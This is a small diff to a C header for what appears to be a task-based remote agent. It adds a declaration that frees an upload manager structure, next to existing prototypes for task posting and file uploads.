@@ -129,6 +129,7 @@ void free_post_request(TaskPostRequest *request);
 void perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status);
 
 UploadManager initialise_upload_manager(char *callback_uuid, char *task_id, char *file_uuid);
+void free_upload_manager(UploadManager *upload);
 void perform_upload(AgentState *stage, UploadManager *upload);
 
 void pack_char(char *buf, int *offset, char paydata);
